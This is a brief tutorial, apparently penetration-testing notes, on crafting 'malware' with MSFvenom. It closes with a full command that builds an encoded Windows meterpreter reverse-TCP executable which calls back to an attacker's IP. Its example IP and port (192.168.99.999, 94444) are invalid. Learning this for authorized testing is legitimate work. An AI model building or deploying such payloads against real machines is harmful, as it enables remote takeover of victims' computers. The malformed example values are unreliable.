To gain access to the TARGET remote machine, we have to create the malware which will grant our ATTACKER machine access to exploit processes on the TARGET machine.

To craft the malware, we make use of the MSFvenom commands.

**MSFvenom** is a penetration testing tool used to create payload for exploitation and post-exploitation.

we make use of the help page of MSFvenom to craft a proper malware.
```
msfvenom -h
```
A proper malware has 4 parts; Payload , Platform, Encoder & File format.

To list out multiple payloads, platforms, encoders on the MSFvenom page, We use the command; 
```
msfvenom -l payloads
```
```
msfvenom -l platforms
```
```
msfvenom -l encoders
```

The general formula for crafting the basic malware will also involve the IP address to be used and a suitable port number
```
msfvenom -p (any payload) LHOST=(kali_IP) LPORT=94444 or 8080) -e (any encoder) --platform (any platform) -f (any file format) > (a unique filename).(file format)
```

For example, here is a command to create a malware with all the elements in the general formula being applied
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.99.999 LPORT=4444 -e x86/call4_dword_xor --platform windows -f exe > meter_revtcp.exe
```
